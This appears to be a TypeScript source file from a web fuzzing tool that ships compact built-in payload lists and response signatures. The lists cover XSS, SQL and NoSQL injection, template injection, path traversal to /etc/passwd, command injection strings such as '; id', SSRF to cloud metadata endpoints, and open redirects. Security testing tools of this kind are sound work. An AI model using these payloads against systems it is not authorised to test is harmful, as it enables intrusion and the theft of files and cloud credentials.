// Curated, frozen payload sets shipped in-repo (auditable, offline). These are the
// day-to-day fuzzing lists the Intruder loads; the operator's own lists live in
// the payload_sets table. Kept deliberately compact and high-signal — a handful of
// proven payloads per class, not an exhaustive dump.

export interface PayloadSet {
  id: string
  name: string
  category: string
  payloads: string[]
}

export const BUILTIN_PAYLOAD_SETS: readonly PayloadSet[] = [
  {
    id: 'xss-polyglots',
    name: 'XSS polyglots',
    category: 'xss',
    payloads: [
      `'"><svg/onload=confirm(1)>`,
      `"><img src=x onerror=confirm(1)>`,
      `javascript:confirm(1)`,
      `'"><script>confirm(1)</script>`,
      `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=confirm() )//`,
      `<svg><animate onbegin=confirm(1) attributeName=x dur=1s>`,
    ],
  },
  {
    id: 'sqli-error',
    name: 'SQLi (error-based probes)',
    category: 'sqli',
    payloads: [`'`, `"`, `')`, `';`, `' OR '1'='1`, `' OR 1=1-- -`, `1' AND SLEEP(3)-- -`, `" OR ""="`, `') OR ('1'='1`],
  },
  {
    id: 'sqli-auth-bypass',
    name: 'SQLi auth bypass',
    category: 'sqli',
    payloads: [`admin'-- -`, `admin' #`, `' OR 1=1 LIMIT 1-- -`, `') OR ('a'='a`, `" OR 1=1-- -`],
  },
  {
    id: 'ssti',
    name: 'SSTI markers',
    category: 'ssti',
    payloads: [`{{7*7}}`, `\${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{{7*'7'}}`, `\${{7*7}}`, `#{ 7*7 }`, `*{7*7}`],
  },
  {
    id: 'lfi',
    name: 'LFI / path traversal',
    category: 'lfi',
    payloads: [
      `../../../../etc/passwd`,
      `....//....//....//etc/passwd`,
      `..%2f..%2f..%2f..%2fetc%2fpasswd`,
      `/etc/passwd`,
      `..\\..\\..\\..\\windows\\win.ini`,
      `php://filter/convert.base64-encode/resource=index.php`,
    ],
  },
  {
    id: 'cmd-injection',
    name: 'Command injection',
    category: 'cmdi',
    payloads: [`; id`, `| id`, `|| id`, `& whoami`, `\`id\``, `$(id)`, `; sleep 3`, `%0a id`, `\n id`],
  },
  {
    id: 'ssrf',
    name: 'SSRF targets',
    category: 'ssrf',
    payloads: [
      `http://169.254.169.254/latest/meta-data/`,
      `http://127.0.0.1:80/`,
      `http://localhost/`,
      `http://[::1]/`,
      `http://169.254.169.254/`,
      `http://metadata.google.internal/computeMetadata/v1/`,
    ],
  },
  {
    id: 'nosqli',
    name: 'NoSQL injection',
    category: 'nosqli',
    payloads: [`' || '1'=='1`, `[$ne]=1`, `{"$gt":""}`, `{"$ne":null}`, `';return true;var x='`, `[$regex]=.*`],
  },
  {
    id: 'open-redirect',
    name: 'Open redirect',
    category: 'redirect',
    payloads: [`//evil.example.org`, `/\\evil.example.org`, `https://evil.example.org`, `%2f%2fevil.example.org`, `https:evil.example.org`],
  },
]

// Canned response signatures to pair with fuzzing — grep-match these in responses
// to spot injection tells (SQL errors, stack traces, template output like 49).
export interface GrepPhraseSet {
  id: string
  name: string
  phrases: string[]
}

export const BUILTIN_GREP_PHRASES: readonly GrepPhraseSet[] = [
  {
    id: 'sql-errors',
    name: 'SQL error strings',
    phrases: ['SQL syntax', 'mysql_fetch', 'ORA-01756', 'PostgreSQL', 'SQLite/JDBCDriver', 'Unclosed quotation mark', 'quoted string not properly terminated'],
  },
  { id: 'stack-traces', name: 'Stack traces / debug', phrases: ['Traceback (most recent call last)', 'Warning: ', 'Fatal error', 'Exception in thread', 'at java.', '.php on line'] },
  { id: 'ssti-eval', name: 'SSTI evaluated output', phrases: ['49', '1592367'] },
  { id: 'lfi-passwd', name: 'LFI success', phrases: ['root:x:0:0:', '[extensions]', 'for 16-bit app support'] },
]
